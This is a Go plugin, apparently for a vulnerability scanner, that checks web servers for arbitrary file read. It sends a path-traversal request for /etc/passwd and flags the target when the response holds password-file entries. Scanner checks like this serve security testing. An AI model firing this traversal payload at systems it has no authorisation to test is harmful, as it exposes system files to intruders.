package goplugin

import (
	"net/http"
	"strings"
	"vuldb/common"
	"vuldb/plugin"
)

type webServerLFI struct {
	info   common.PluginInfo
	result []common.PluginInfo
}

func init() {
	plugin.Regist("web", &webServerLFI{})
}
func (d *webServerLFI) Init() common.PluginInfo{
	d.info = common.PluginInfo{
		Name:    "WebServer 任意文件读取",
		Remarks: "web容器对请求处理不当，可能导致可以任意文件读取(例：GET ../../../../../etc/passwd)",
		Level:   1,
		Type:    "LFI",
		Author:   "wolf",
        References: common.References{
        	URL: "",
        	CVE: "",
        },
	}
	return d.info
}
func (d *webServerLFI) GetResult() []common.PluginInfo {
	return d.result
}
func (d *webServerLFI) Check(URL string, meta plugin.TaskMeta) bool {
	if meta.System == "windows" {
		return false
	}
	request, err := http.NewRequest("GET", URL+"/../../../../../../../../etc/passwd", nil)
	resp, err := common.RequestDo(request, true)
	if err != nil {
		return false
	}
	if strings.Contains(resp.ResponseRaw, "root:") && strings.Contains(resp.ResponseRaw, "nobody:") {
		result := d.info
		result.Response = resp.ResponseRaw
		result.Request = resp.RequestRaw
		d.result = append(d.result, result)
		return true
	}
	return false
}
